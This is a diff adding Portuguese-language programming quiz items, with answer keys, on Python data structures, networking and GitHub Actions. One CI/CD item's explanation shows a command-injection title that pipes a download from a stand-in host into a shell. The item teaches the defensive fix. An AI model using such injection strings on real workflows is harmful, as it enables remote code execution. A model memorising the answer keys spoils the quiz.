+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-012",
+    "language": "python",
+    "question": "Entre as duas pessoas de 30 anos, quem vem primeiro no resultado?",
+    "code": "pessoas = [(\"Ana\", 30), (\"Bia\", 25), (\"Caio\", 30), (\"Dani\", 25)]\nprint(sorted(pessoas, key=lambda p: p[1]))",
+    "options": [
+      "Ana: a ordenação do Python é estável e mantém a ordem",
+      "Ana, mas só porque o nome vem antes na ordem alfabética",
+      "Caio: o sorted coloca o último dos empatados na frente",
+      "Depende: o Python embaralha os empates a cada execução"
+    ],
+    "answer": 0,
+    "explanation": "O `sorted` (e o `list.sort`) é estável: itens com a mesma chave ficam na ordem em que estavam. Isso permite ordenar em passos: primeiro pelo critério secundário, depois pelo principal. Aqui o resultado é Bia, Dani, Ana, Caio.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-013",
+    "language": "python",
+    "question": "O que imprimem os dois prints?",
+    "code": "import heapq\n\nh = []\nfor n in [5, 1, 4]:\n    heapq.heappush(h, n)\nprint(h[0])\nprint(h)",
+    "options": [
+      "1 e [5, 4, 1]: o heap fica ordenado do maior para o menor",
+      "1 e [1, 5, 4]: só o primeiro é garantidamente o menor",
+      "5 e [5, 1, 4]: o heappush só acrescenta no final da lista",
+      "1 e [1, 4, 5]: o heap mantém a lista sempre ordenada"
+    ],
+    "answer": 1,
+    "explanation": "O `heapq` é um heap mínimo guardado numa lista: a raiz (`h[0]`) é sempre o menor item, e `heappop` o devolve em O(log n). Mas o resto da lista só obedece à regra do heap (pai ≤ filhos), não está ordenado.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-014",
+    "language": "python",
+    "question": "O que esse código imprime?",
+    "code": "tabuleiro = [[0] * 2] * 3\ntabuleiro[0][0] = 1\nprint(tabuleiro)",
+    "options": [
+      "[[1, 0], [1, 0], [1, 0]]",
+      "[[1, 0], [0, 0], [0, 0]]",
+      "[[0, 0], [0, 0], [0, 0]]",
+      "[[1, 0], [1, 0], [0, 0]]"
+    ],
+    "answer": 0,
+    "explanation": "O `*` repete a referência para a MESMA lista interna três vezes, não cria três listas. Mudar uma linha muda todas. O certo é criar uma lista nova por linha: `[[0] * 2 for _ in range(3)]`.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-015",
+    "language": "python",
+    "question": "O que esse código imprime no final?",
+    "code": "from functools import lru_cache\n\nchamadas = 0\n\n@lru_cache(maxsize=2)\ndef f(x):\n    global chamadas\n    chamadas += 1\n    return x * 2\n\nf(1); f(2); f(3); f(1)\nprint(chamadas)",
+    "options": [
+      "2: o cache calcula só os dois primeiros valores",
+      "4: o f(1) foi descartado quando o f(3) entrou",
+      "3: a segunda chamada de f(1) vem do cache",
+      "1: o cache guarda todos os resultados sem limite"
+    ],
+    "answer": 1,
+    "explanation": "Com `maxsize=2`, o cache guarda só os 2 resultados mais recentes (LRU: o menos usado recentemente sai). Ao chamar `f(3)`, o `f(1)` foi descartado, então o segundo `f(1)` é calculado de novo: 4 execuções do corpo.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "ds-016",
+    "language": "python",
+    "question": "Por que `list.append` é considerado O(1) amortizado?",
+    "code": "",
+    "options": [
+      "Porque cada append reordena os itens em segundo plano",
+      "Às vezes realoca (cópia O(n)), mas em média custa constante",
+      "Porque o Python usa uma lista ligada e insere sempre no final",
+      "Porque o append só guarda um ponteiro e nunca copia nada"
+    ],
+    "answer": 1,
+    "explanation": "A lista reserva mais espaço do que precisa e o aumenta em degraus proporcionais. Na maioria dos `append` só se escreve no espaço sobrando; de raro em raro há uma realocação com cópia (O(n)). Espalhado por todos os appends, o custo médio é constante.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "data-structures",
+      "label": "Estruturas de dados",
+      "description": "Listas, conjuntos, dicionários, filas e complexidade"
+    }
+  },
+  {
+    "id": "net-001",
+    "language": "bash",
+    "question": "O que o DNS faz?",
+    "code": "nslookup example.com",
+    "options": [
+      "Criptografa a conexão entre o navegador e o site",
+      "Traduz nomes de sites (exemplo.com) em endereços IP",
+      "Escolhe o provedor de internet mais barato da região",
+      "Aumenta a velocidade da internet guardando as páginas"
+    ],
+    "answer": 1,
+    "explanation": "O DNS é a \"lista telefônica\" da internet: os computadores se falam por endereço IP, e o DNS converte o nome que as pessoas digitam (`example.com`) no IP do servidor. Ele não criptografa nada nem escolhe provedor.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-002",
+    "language": "bash",
+    "question": "O que é o endereço 127.0.0.1 (localhost)?",
+    "code": "ping 127.0.0.1",
+    "options": [
+      "O endereço do roteador da sua casa ou escritório",
+      "Um endereço de teste que a internet pública responde",
+      "O próprio computador, sem sair para a rede",
+      "O servidor DNS do seu provedor de internet"
+    ],
+    "answer": 2,
+    "explanation": "O 127.0.0.1 é o endereço de loopback: a conexão volta para a própria máquina, sem passar pela rede. Um servidor que escuta só nele aceita conexões do próprio computador e recusa as que chegam pelo IP da rede local.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-003",
+    "language": "http",
+    "question": "Qual é a porta padrão do HTTPS?",
+    "code": "https://exemplo.com:____/",
+    "options": [
+      "22",
+      "80",
+      "443",
+      "8080"
+    ],
+    "answer": 2,
+    "explanation": "Cada serviço tem uma porta de costume: HTTP na 80, HTTPS na 443, SSH na 22. O navegador usa a 443 sozinho quando o endereço começa com `https://`. A 8080 é só uma alternativa comum para HTTP em desenvolvimento.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-004",
+    "language": "bash",
+    "question": "Numa conexão, o que a porta identifica?",
+    "code": "",
+    "options": [
+      "Qual provedor de internet está sendo usado na conexão",
+      "Qual é a velocidade máxima permitida na conexão",
+      "Qual computador da rede é o destino final do pacote",
+      "Qual programa da máquina deve receber os dados"
+    ],
+    "answer": 3,
+    "explanation": "O IP leva os dados até a máquina certa, e a porta leva até o programa certo dentro dela (um servidor web na 80, um banco de dados na 5432...). Dois programas no mesmo IP convivem porque usam portas diferentes.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-005",
+    "language": "bash",
+    "question": "Qual é a diferença principal entre TCP e UDP?",
+    "code": "",
+    "options": [
+      "O TCP só funciona na internet e o UDP só em redes locais",
+      "O UDP é criptografado por padrão e o TCP não é",
+      "O TCP garante entrega e ordem; o UDP envia sem garantias",
+      "O UDP exige uma conexão prévia e o TCP envia direto"
+    ],
+    "answer": 2,
+    "explanation": "O TCP abre uma conexão, confirma o recebimento, reenvia o que se perde e entrega os bytes em ordem. O UDP só despacha pacotes (datagramas): é mais leve e rápido, mas sem garantia. Serve a vídeo ao vivo, jogos e DNS; o TCP serve a web, e-mail e arquivos.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-006",
+    "language": "bash",
+    "question": "Quantos endereços de host utilizáveis tem a rede 192.168.0.0/24?",
+    "code": "",
+    "options": [
+      "24",
+      "254",
+      "255",
+      "256"
+    ],
+    "answer": 1,
+    "explanation": "O /24 reserva 24 bits para a rede e deixa 8 para os hosts: 2⁸ = 256 endereços. Dois não servem para máquinas: o primeiro (192.168.0.0, o endereço da rede) e o último (192.168.0.255, o broadcast). Sobram 254.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-007",
+    "language": "http",
+    "question": "Qual é uma requisição HTTP/1.1 mínima e válida?",
+    "code": "",
+    "options": [
+      "POST / HTTP/1.1, que é o único método sem cabeçalhos",
+      "GET http://exemplo.com, com ponto e vírgula no final",
+      "GET / HTTP/1.1 e nada além da primeira linha, sem Host",
+      "GET / HTTP/1.1 + Host: exemplo.com + linha em branco"
+    ],
+    "answer": 3,
+    "explanation": "No HTTP/1.1, o cabeçalho `Host` é obrigatório (vários sites dividem o mesmo IP e o servidor precisa saber qual é o pedido), e a linha em branco marca o fim dos cabeçalhos. Sem o `Host`, o servidor responde `400 Bad Request`.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-008",
+    "language": "bash",
+    "question": "Uma conexão tem alta largura de banda, mas latência de 300 ms. Qual é o efeito?",
+    "code": "",
+    "options": [
+      "Os downloads grandes também ficam lentos, em qualquer caso",
+      "Downloads grandes são rápidos, mas cada ida e volta demora",
+      "A conexão cai sempre que passa de 300 ms de uso",
+      "Só os vídeos são afetados; páginas e arquivos não"
+    ],
+    "answer": 1,
+    "explanation": "Largura de banda é quanto cabe por segundo (o diâmetro do cano); latência é quanto demora uma ida e volta (o comprimento). Com muita banda e muita latência, um arquivo grande baixa depressa, mas cada clique, requisição ou handshake espera 300 ms.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-009",
+    "language": "bash",
+    "question": "Ao abrir https://exemplo.com, o que o navegador confere no certificado?",
+    "code": "",
+    "options": [
+      "Se o endereço IP do site está na lista de provedores aprovados",
+      "Se o site usa a porta 443 e responde em menos de 100 ms",
+      "Domínio certo, autoridade confiável e dentro da validade",
+      "Se o dono do site pagou o certificado há menos de um ano"
+    ],
+    "answer": 2,
+    "explanation": "O certificado liga uma chave pública a um domínio. O navegador confere se ele vale para aquele nome, se foi emitido por uma autoridade (CA) em que confia e se não venceu. Falhando qualquer um, aparece o aviso de conexão não segura.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-010",
+    "language": "bash",
+    "question": "Qual destes é um endereço IP privado, que não é roteado na internet?",
+    "code": "",
+    "options": [
+      "200.100.50.25",
+      "8.8.8.8",
+      "192.168.1.10",
+      "172.32.0.1"
+    ],
+    "answer": 2,
+    "explanation": "As faixas privadas (RFC 1918) são 10.0.0.0/8, 172.16.0.0/12 (de 172.16 a 172.31) e 192.168.0.0/16. O 172.32.0.1 fica logo fora da faixa e é público. Redes domésticas usam IPs privados e o roteador faz NAT para sair com um IP público.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-011",
+    "language": "bash",
+    "question": "O que significa o TTL de um registro DNS?",
+    "code": "example.com.   300   IN   A   93.184.216.34",
+    "options": [
+      "Quantas vezes por dia o domínio pode ser acessado",
+      "Quantos servidores respondem pelo nome do site",
+      "A velocidade máxima de download permitida pelo site",
+      "Por quanto tempo a resposta pode ficar em cache"
+    ],
+    "answer": 3,
+    "explanation": "O TTL (time to live), em segundos, diz a navegadores e resolvedores por quanto tempo podem reaproveitar a resposta sem perguntar de novo. TTL baixo troca de servidor mais rápido, mas gera mais consultas; TTL alto economiza consultas, mas a mudança demora a valer.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-012",
+    "language": "bash",
+    "question": "O servidor escuta em 127.0.0.1, mas http://localhost às vezes falha. Por quê?",
+    "code": "",
+    "options": [
+      "O localhost só funciona quando a porta 80 está liberada",
+      "localhost pode virar ::1 (IPv6), onde ninguém escuta",
+      "O servidor precisa de um certificado para atender localhost",
+      "O navegador bloqueia o acesso a localhost por segurança"
+    ],
+    "answer": 1,
+    "explanation": "O nome `localhost` pode apontar para 127.0.0.1 (IPv4) e para ::1 (IPv6). Se o cliente tentar o ::1 primeiro e o servidor só escutar no IPv4, a conexão é recusada. A saída é escutar nos dois, ou chamar 127.0.0.1 de forma explícita.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-013",
+    "language": "bash",
+    "question": "Quais pacotes abrem uma conexão TCP, em ordem?",
+    "code": "",
+    "options": [
+      "SYN, ACK, FIN",
+      "SYN, SYN-ACK, ACK",
+      "HELLO, ACK, READY",
+      "ACK, SYN, SYN-ACK"
+    ],
+    "answer": 1,
+    "explanation": "O handshake de três vias: o cliente envia SYN (\"quero conectar\"), o servidor responde SYN-ACK (\"ok, e eu também\") e o cliente confirma com ACK. Só então os dados fluem. O FIN, ao contrário, serve para encerrar.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-014",
+    "language": "bash",
+    "question": "O que acontece ao enviar dados a uma porta onde ninguém escuta, no TCP e no UDP?",
+    "code": "",
+    "options": [
+      "Os dois recusam na hora, com o mesmo erro de conexão recusada",
+      "Os dois fingem que deu certo e perdem os dados em silêncio",
+      "TCP: fica esperando para sempre; UDP: recusa na hora com erro",
+      "TCP: recusa na hora (RST); UDP: envia e ninguém responde"
+    ],
+    "answer": 3,
+    "explanation": "O TCP exige conexão: a porta fechada responde com RST e o cliente recebe \"conexão recusada\" imediatamente. O UDP não tem conexão, então o envio \"funciona\" e a mensagem se perde (no máximo chega um aviso ICMP, que muitos programas nem veem).",
+    "difficulty": "expert",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-015",
+    "language": "http",
+    "question": "Para que serve o cabeçalho Connection: keep-alive?",
+    "code": "GET /api/produtos HTTP/1.1\nHost: exemplo.com\nConnection: keep-alive",
+    "options": [
+      "Reaproveitar a conexão TCP em várias requisições",
+      "Manter o site no ar mesmo se o servidor reiniciar",
+      "Repetir a requisição automaticamente se ela falhar",
+      "Deixar o navegador logado depois de fechar a aba"
+    ],
+    "answer": 0,
+    "explanation": "Abrir uma conexão TCP (e TLS, no HTTPS) custa idas e voltas. Com `keep-alive`, a mesma conexão atende várias requisições em sequência, poupando esse custo. No HTTP/1.1 é o comportamento padrão; `Connection: close` é que pede para fechar.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "net-016",
+    "language": "bash",
+    "question": "O computador 192.168.1.10/24 consegue falar direto com 192.168.2.20/24, sem roteador?",
+    "code": "",
+    "options": [
+      "Não: são redes diferentes (192.168.1.0/24 e 192.168.2.0/24)",
+      "Não, porque os dois IPs terminam em números diferentes entre si",
+      "Sim: os dois começam com 192.168, então são da mesma rede",
+      "Sim, desde que usem a mesma porta nos dois lados da conexão"
+    ],
+    "answer": 0,
+    "explanation": "A máscara /24 diz que só os 3 primeiros números identificam a rede. Os dois ficam em redes diferentes, então o tráfego precisa passar por um roteador (gateway). Com /16, a rede seria 192.168.0.0 e os dois se falariam direto.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "networking-basics",
+      "label": "Redes",
+      "description": "IP, DNS, portas, TCP e UDP, HTTP e TLS"
+    }
+  },
+  {
+    "id": "cic-001",
+    "language": "yaml",
+    "question": "O que é integração contínua (CI)?",
+    "code": "",
+    "options": [
+      "Revisar cada commit com uma pessoa do time antes de aceitar o envio",
+      "Juntar todo o código do time numa única branch por semana",
+      "Rodar build e testes sozinhos a cada mudança enviada ao repositório",
+      "Publicar o site em produção manualmente, uma vez por mês"
+    ],
+    "answer": 2,
+    "explanation": "Na CI, cada mudança enviada ao repositório dispara automaticamente a compilação e os testes. Assim os problemas de integração aparecem em minutos, quando ainda são pequenos, e não semanas depois, quando várias mudanças se misturaram.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-002",
+    "language": "yaml",
+    "question": "Em qual pasta do repositório ficam os workflows do GitHub Actions?",
+    "code": "",
+    "options": [
+      "ci/workflows",
+      ".github/workflows",
+      ".workflows/github",
+      ".github/actions"
+    ],
+    "answer": 1,
+    "explanation": "O GitHub procura os arquivos `.yml` ou `.yaml` de workflow na pasta `.github/workflows`. Cada arquivo é um workflow, e um repositório pode ter vários (um para testes, outro para deploy...).",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-003",
+    "language": "yaml",
+    "question": "Quando esse workflow roda?",
+    "code": "on:\n  pull_request:",
+    "options": [
+      "Quando alguém comenta ou reage em qualquer pull request do repositório",
+      "Só quando o pull request é aprovado e está pronto para o merge",
+      "Quando um pull request é aberto, recebe novos commits ou é reaberto",
+      "Toda noite, às 00:00 UTC, em todas as branches do repositório"
+    ],
+    "answer": 2,
+    "explanation": "Sem a opção `types`, o evento `pull_request` usa os tipos padrão: `opened` (aberto), `synchronize` (novos commits) e `reopened` (reaberto). Para outros momentos, como `closed` ou `labeled`, é preciso listá-los em `types`.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-004",
+    "language": "yaml",
+    "question": "Qual a diferença entre CI e CD (entrega contínua)?",
+    "code": "",
+    "options": [
+      "São o mesmo processo, só mudam o nome conforme a empresa",
+      "CI integra e testa cada mudança; CD entrega a versão aprovada",
+      "CI roda só em produção; CD roda só na máquina de quem programa",
+      "CI cuida do banco de dados; CD cuida da interface do usuário"
+    ],
+    "answer": 1,
+    "explanation": "A CI (integração contínua) garante que cada mudança compila e passa nos testes. A CD (entrega ou implantação contínua) leva a versão aprovada adiante, até um ambiente de testes ou direto à produção, de forma automática e repetível.",
+    "difficulty": "beginner",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-005",
+    "language": "yaml",
+    "question": "Em que ordem os jobs rodam?",
+    "code": "jobs:\n  testar:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n  publicar:\n    needs: testar\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run deploy\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint",
+    "options": [
+      "Um de cada vez, na ordem em que aparecem no arquivo",
+      "publicar roda primeiro, já que declarou a dependência no arquivo",
+      "testar e lint em paralelo; publicar só depois do testar",
+      "Todos em paralelo, pois o needs só serve para documentar"
+    ],
+    "answer": 2,
+    "explanation": "Os jobs rodam em paralelo por padrão. O `needs` cria dependência: `publicar` só começa quando `testar` termina com sucesso (e é pulado se ele falhar). O `lint` não depende de ninguém e roda junto com o `testar`.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-006",
+    "language": "yaml",
+    "question": "Um job gera um arquivo, mas o job seguinte não o encontra. Por quê?",
+    "code": "",
+    "options": [
+      "Os jobs só enxergam os arquivos que estão na pasta .github/workflows",
+      "O GitHub apaga os arquivos sempre que um job termina com erro",
+      "O segundo job precisa de um runs-on diferente do primeiro",
+      "Cada job roda no próprio runner; é preciso passar por artifacts"
+    ],
+    "answer": 3,
+    "explanation": "Cada job roda numa máquina virtual (ou contêiner) limpa e própria. Os steps do MESMO job compartilham o disco, mas jobs diferentes não. Para passar arquivos de um job a outro, envie-os como artifact (`upload-artifact`) e baixe no outro (`download-artifact`).",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-007",
+    "language": "yaml",
+    "question": "Quantas execuções do job esse trecho cria?",
+    "code": "strategy:\n  matrix:\n    os: [ubuntu-latest, windows-latest]\n    node: [20, 22]",
+    "options": [
+      "2, uma para cada sistema operacional da lista",
+      "2, uma para cada versão do Node da lista",
+      "6, que é a soma dos itens das duas listas",
+      "4, uma para cada combinação de os e node"
+    ],
+    "answer": 3,
+    "explanation": "A matriz gera uma execução para cada combinação das variáveis: 2 sistemas × 2 versões = 4 jobs (ubuntu+20, ubuntu+22, windows+20, windows+22). É a forma de testar o código em vários ambientes sem repetir o job.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-008",
+    "language": "yaml",
+    "question": "Onde fica guardado o valor de DEPLOY_TOKEN?",
+    "code": "- run: ./deploy.sh\n  env:\n    TOKEN: ${{ secrets.DEPLOY_TOKEN }}",
+    "options": [
+      "Nos Secrets do repositório, fora do código do projeto",
+      "No navegador de quem abriu o pull request, durante a execução",
+      "Na branch main, dentro de um arquivo .env criptografado",
+      "No próprio arquivo do workflow, escrito em texto puro"
+    ],
+    "answer": 0,
+    "explanation": "Segredos ficam em Settings → Secrets and variables, cifrados pelo GitHub, e entram no workflow pela expressão `${{ secrets.NOME }}`. O valor nunca aparece no código, e o GitHub o mascara nos logs.",
+    "difficulty": "intermediate",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-009",
+    "language": "yaml",
+    "question": "Para que serve o hashFiles na chave do cache?",
+    "code": "- uses: actions/cache@v4\n  with:\n    path: ~/.npm\n    key: npm-${{ hashFiles('**/package-lock.json') }}",
+    "options": [
+      "Criptografa o cache para que ninguém consiga ler as dependências",
+      "A chave muda quando o lockfile muda, e um cache novo é criado",
+      "Faz o cache expirar sozinho todos os dias à meia-noite",
+      "Compara os arquivos do cache com os do repositório linha a linha"
+    ],
+    "answer": 1,
+    "explanation": "Enquanto o `package-lock.json` não mudar, o hash (e a chave) é o mesmo e o cache anterior é reaproveitado, poupando o `npm install`. Se as dependências mudam, a chave muda e um cache novo é criado automaticamente.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-010",
+    "language": "yaml",
+    "question": "O que isso faz quando você envia um commit novo na mesma branch?",
+    "code": "concurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true",
+    "options": [
+      "Ignora o commit novo até a execução antiga terminar sozinha",
+      "Cancela a execução antiga em andamento e roda só a nova",
+      "Coloca a nova execução numa fila, atrás da que está rodando",
+      "Roda as duas execuções ao mesmo tempo, em máquinas separadas"
+    ],
+    "answer": 1,
+    "explanation": "Execuções do mesmo `group` não rodam juntas. Com `cancel-in-progress: true`, a execução antiga é cancelada quando chega uma nova do mesmo grupo: poupa minutos de CI e evita testar código que já foi substituído.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-011",
+    "language": "yaml",
+    "question": "Por que declarar permissions: contents: read no workflow?",
+    "code": "permissions:\n  contents: read",
+    "options": [
+      "Faz o workflow rodar sem nenhum token, como usuário anônimo",
+      "Deixa o workflow mais rápido ao pular a etapa de checkout",
+      "Limita o GITHUB_TOKEN ao necessário (menor privilégio)",
+      "Impede que o workflow leia qualquer arquivo do repositório"
+    ],
+    "answer": 2,
+    "explanation": "O `GITHUB_TOKEN` é criado a cada execução, e o bloco `permissions` define o que ele pode fazer. Começar só com leitura segue o princípio do menor privilégio: se um passo for comprometido, o estrago é limitado. Dê mais permissões só aos jobs que precisam.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-012",
+    "language": "yaml",
+    "question": "Como exigir a aprovação de uma pessoa antes de um deploy em produção?",
+    "code": "jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: producao\n    steps:\n      - run: ./deploy.sh",
+    "options": [
+      "Usar um environment com revisores obrigatórios",
+      "Colocar needs: aprovacao no job, apontando para um job vazio",
+      "Trocar o runs-on por um runner que só roda de madrugada",
+      "Escrever if: aprovado no job e marcar a variável à mão"
+    ],
+    "answer": 0,
+    "explanation": "Um `environment` do GitHub pode ter regras de proteção, como revisores obrigatórios: o job que o referencia pausa até uma das pessoas aprovar. O ambiente também guarda segredos próprios e pode limitar quais branches fazem deploy nele.",
+    "difficulty": "advanced",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-013",
+    "language": "yaml",
+    "question": "Um pull request vindo de um fork passa a rodar o seu workflow. O que acontece com os secrets?",
+    "code": "on:\n  pull_request:\njobs:\n  testar:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./testar.sh\n        env:\n          TOKEN: ${{ secrets.MEU_TOKEN }}",
+    "options": [
+      "Não são entregues (só o GITHUB_TOKEN, somente leitura)",
+      "O workflow nem chega a rodar, pois forks são bloqueados",
+      "São entregues, mas mascarados em todas as linhas de log",
+      "São entregues normalmente, como em qualquer outra branch"
+    ],
+    "answer": 0,
+    "explanation": "Para proteger os segredos de quem abre um PR malicioso, os workflows de `pull_request` vindos de forks não recebem secrets (só o `GITHUB_TOKEN`, que fica somente leitura). Por isso o `${{ secrets.MEU_TOKEN }}` chega vazio.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-014",
+    "language": "yaml",
+    "question": "Por que fixar uma action pelo SHA completo do commit, e não por tag?",
+    "code": "# em vez de\n- uses: acme/deploy@v2\n# use\n- uses: acme/deploy@3f9e1c8a7b6d4e2f1a0b9c8d7e6f5a4b3c2d1e0f",
+    "options": [
+      "Uma tag pode ser movida para outro código; o SHA não",
+      "O SHA dispensa o GitHub de baixar a action a cada execução",
+      "A tag impede o uso da action em repositórios privados",
+      "O SHA faz a action rodar mais rápido que a tag"
+    ],
+    "answer": 0,
+    "explanation": "Tags e branches podem ser reapontadas: quem controla (ou invade) o repositório da action pode trocar o código de `v2` por um malicioso, e o seu workflow passaria a rodá-lo. O SHA completo é imutável, e forjar outro commit com o mesmo hash é inviável.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-015",
+    "language": "yaml",
+    "question": "Qual é o risco desse passo, e qual a correção recomendada?",
+    "code": "- run: echo \"${{ github.event.pull_request.title }}\"",
+    "options": [
+      "Vazamento do título em logs públicos; ative a máscara de texto",
+      "Nenhum: o GitHub escapa todo texto que vem de fontes externas",
+      "Estouro do limite de caracteres; corte o título em 100 letras",
+      "Injeção de script; passe o valor por uma variável de ambiente"
+    ],
+    "answer": 3,
+    "explanation": "A expressão `${{ }}` é substituída ANTES de o shell rodar, então um título como `\"; curl evil.sh | sh; \"` vira parte do comando. A correção é pôr o valor numa variável de ambiente (`env: TITULO: ${{ ... }}`) e usar `\"$TITULO\"` no script, onde ele é só dado.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "ci-cd",
+      "label": "CI/CD",
+      "description": "Integração e entrega contínuas com GitHub Actions"
+    }
+  },
+  {
+    "id": "cic-016",
+    "language": "yaml",
+    "question": "No deploy canário (canary), o que acontece?",
+    "code": "",
+    "options": [
+      "A versão antiga é apagada antes de a nova ser testada por alguém",
+      "A nova versão roda só no computador de quem a programou",
+      "O deploy só acontece de madrugada, quando há menos acessos",
+      "A nova versão atende só uma pequena parte dos usuários"
+    ],
+    "answer": 3,
+    "explanation": "No canário, a versão nova recebe de início só uma fatia pequena do tráfego (1% a 5%). Se as métricas e os erros estiverem bem, a fatia cresce até 100%; se não, volta-se atrás com poucos usuários afetados. O blue/green, em comparação, troca todo o tráfego de uma vez entre dois ambientes completos.",
+    "difficulty": "expert",
+    "topic": {
+      "id": "ci-cd",
